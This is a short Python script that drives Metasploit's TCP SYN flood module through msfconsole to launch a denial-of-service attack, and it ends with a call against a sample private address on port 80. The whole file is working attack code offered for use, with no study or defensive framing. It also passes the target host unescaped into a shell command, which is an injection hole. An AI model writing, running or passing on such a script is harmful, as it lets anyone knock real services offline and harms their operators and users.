import subprocess

def run_ddos_attack(rhost, rport=80):
    msf_command = f"""
    msfconsole -q -x "use auxiliary/dos/tcp/synflood;
    set RHOST {rhost};
    set RPORT {rport};
    run; exit"
    """

    process = subprocess.run(msf_command, shell=True, text=True, capture_output=True)
    print(process.stdout)  # Print Metasploit output

run_ddos_attack("192.168.1.100", 80)
